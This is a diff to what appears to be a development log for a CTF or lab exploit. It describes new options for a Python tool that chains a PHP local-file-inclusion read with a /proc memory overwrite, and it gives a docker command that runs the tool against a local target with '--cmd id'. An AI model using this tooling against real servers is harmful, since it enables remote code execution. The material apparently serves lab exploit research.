@@ -104,6 +104,29 @@ docker run --rm --platform linux/amd64 --network env_default --entrypoint python
   --max-region 268435456 --max-final-candidates 5
 ```
 
+- Corrected `tools/proc_mem_coreless_exploit.py` so the LFI/file-read primitive is explicit and configurable instead of only relying on the default `/lfi.php` endpoint.
+- Added support for:
+  - `--file-read-template`,
+  - `--file-param`, `--offset-param`, `--length-param`,
+  - `--scheme`, `--port`, `--phpinfo-path`,
+  - `--host-header` and repeated `--header`.
+- Recorded a replacement full-execution demo that shows the file-read primitive in the operator command:
+  - target: `172.21.0.2:19321`,
+  - file-read template: `http://{host}:{port}/lfi.php?file={path_url}{range_query}`,
+  - cast: `artifacts/coreless_proc_mem_explicit_fileread_20260518.cast`,
+  - gif: `artifacts/coreless_proc_mem_explicit_fileread_20260518.gif`.
+- Equivalent command:
+
+```bash
+docker run --rm --platform linux/amd64 --network env_default --entrypoint python3 \
+  -v "$PWD:/work" -w /work \
+  nginx-rift-ctf-lfi tools/proc_mem_coreless_exploit.py \
+  --target 172.21.0.2:19321 \
+  --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}' \
+  --phpinfo-path "" --cmd id --target-len 6 \
+  --max-region 268435456 --max-final-candidates 5
+```
+
 ### Known-Offset Brute Force Check
 
 - Tested the older no-core, no-proc-mem known-offset candidate path with full 6-byte overwrite:
